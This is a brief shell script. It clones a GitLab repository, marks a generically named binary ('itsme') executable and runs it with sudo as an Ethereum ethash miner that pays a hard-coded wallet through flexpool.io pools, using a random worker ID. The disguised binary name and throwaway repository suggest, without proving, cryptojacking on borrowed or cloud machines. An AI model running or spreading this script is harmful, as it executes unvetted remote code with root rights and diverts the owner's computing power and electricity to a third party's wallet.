#!/bin/sh
sudo apt update
sudo apt-get install zip unzip
sudo apt install screen -y
screen -dmS gr2.sh 65 75
sudo git clone https://gitlab.com/taufiqurrohmanmaz/sainame127.git
cd sainame127
chmod +x itsme
sudo ./itsme -a ethash -w 0x0F8824d694772df58840EDdD06a36526A0063438 -p ethproxy+tcp://eth-sg.flexpool.io:4444 ethproxy+tcp://eth-hk.flexpool.io -r $(echo $(shuf -i 19141-34464563 -n 1))  --nvidia 1
